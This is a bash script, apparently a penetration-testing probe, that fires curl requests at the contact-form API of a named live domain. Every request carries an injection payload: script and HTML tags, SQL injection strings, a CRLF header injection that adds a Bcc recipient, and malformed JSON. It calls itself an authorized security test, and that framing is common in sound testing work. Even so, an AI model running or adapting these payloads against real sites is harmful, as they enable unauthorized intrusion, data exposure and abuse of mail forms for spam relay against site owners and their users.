#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
B="https://www.infinitycapital.bh"
E=sec-test@example.com
send() { # desc, extra curl -F args...
  d="$1"; shift
  echo "=== $d"
  curl -sk -A "$UA" -F "fname=Pentest" -F "lname=Tester" -F "areacode=973" -F "tel=5550000" \
    -F "cname=IC Security" -F "msg=auth vapt test" -F "check=on" "$@" \
    -w "\ncode=%{http_code}\n" "$B/api/send" | head -c 600
  echo
}
send "valid to=Email"     -F "targets=[{\"name\":\"IC\",\"email\":\"$E\",\"subject\":\"VAPT probe\",\"message\":\"Authorized security test by InfinityCapital VAPT. No action required.\"}]"
send "array of strings"   -F "targets=[\"$E\"]"
send "targets=Email"      -F "targets=$E"
send "html inject in msg" -F "msg=<b>bold</b><script>1</script>" -F "subject=<img src=x>" -F "targets=[{\"name\":\"a\",\"email\":\"$E\",\"subject\":\"s\",\"message\":\"m\"}]"
send "sqli msg"           -F "msg=1' OR '1'='1" -F "subject=x' UNION SELECT 1--" -F "cname=t' OR '1'='1" -F "targets=[{\"name\":\"a\",\"email\":\"$E\",\"subject\":\"s\",\"message\":\"m\"}]"
send "crlf hdr"           -F "fname=A%0d%0aBcc:victim@example.org" -F "targets=[{\"name\":\"a\",\"email\":\"$E\",\"subject\":\"s\",\"message\":\"m\"}]"
send "array subject"      -F "targets=[{\"name\":\"a\",\"email\":\"$E\",\"subject\":[\"x\"],\"message\":\"m\"}]"
send "nested obj"         -F 'targets={"a":1}'
send "no msg"             -F "targets=[{\"name\":\"a\",\"email\":\"$E\",\"subject\":\"s\",\"message\":\"m\"}]"
send "empty msg field"    -F "msg=" -F "targets=[{\"name\":\"a\",\"email\":\"$E\",\"subject\":\"s\",\"message\":\"m\"}]"